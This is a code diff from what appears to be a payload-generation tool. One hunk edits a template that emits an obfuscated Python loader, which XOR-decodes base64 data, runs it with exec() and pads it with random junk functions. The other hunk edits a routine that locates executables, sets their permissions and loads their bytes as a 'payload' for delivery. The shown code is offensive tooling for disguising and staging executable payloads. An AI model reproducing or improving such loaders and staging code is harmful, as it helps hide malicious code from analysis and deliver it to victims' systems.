@@ -199,7 +199,7 @@ exec(''.join({xor_func} for c,k in zip(base64.b64decode({var_b64}), {var_iter}))
         decoder = f"""
 import base64, itertools, sys, random
 
-def {junk固然1_name}():
+def {junk1_name}():
     return [random.randint(1, 100) for _ in range(10)]
 
 {var_data} = {encoded}
@@ -620,8 +620,15 @@ def check_environment():
                             ]
                             for path in expected_paths:
                                 if os.path.isfile(path):
-                                    self.logger.info(f"Found executable: {path}")
-                                    os.chmod(path, 0o755)  # Ensure executable permissions
+                                    # Ensure executable permissions
+                                    os.chmod(path, 0o755)
+                                    # Log file details
+                                    file_stat = os.stat(path)
+                                    self.logger.info(f"Found executable: {path}, size: {file_stat.st_size}, permissions: {oct(file_stat.st_mode)[-3:]}")
+                                    # Verify file is not empty
+                                    if file_stat.st_size == 0:
+                                        self.logger.error(f"Executable {path} is empty")
+                                        raise Exception(f"Executable {path} is empty")
                                     with open(path, "rb") as f:
                                         resp.payload = f.read()
                                     resp.filename = "payload"
